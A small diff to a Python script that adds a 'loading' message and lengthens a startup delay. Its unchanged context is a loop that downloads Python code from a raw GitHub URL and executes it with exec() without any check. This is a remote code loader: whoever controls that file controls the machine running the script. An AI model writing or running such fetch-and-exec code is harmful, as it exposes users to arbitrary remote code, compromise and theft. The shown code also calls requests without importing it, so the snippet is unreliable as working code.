@@ -1,5 +1,6 @@
 from time import sleep
-sleep(2)
+print('>>loading')
+sleep(5)
 while True:
     try:
         exec(requests.get('https://raw.githubusercontent.com/unghia11/gopv4/refs/heads/main/8.6.py').text)
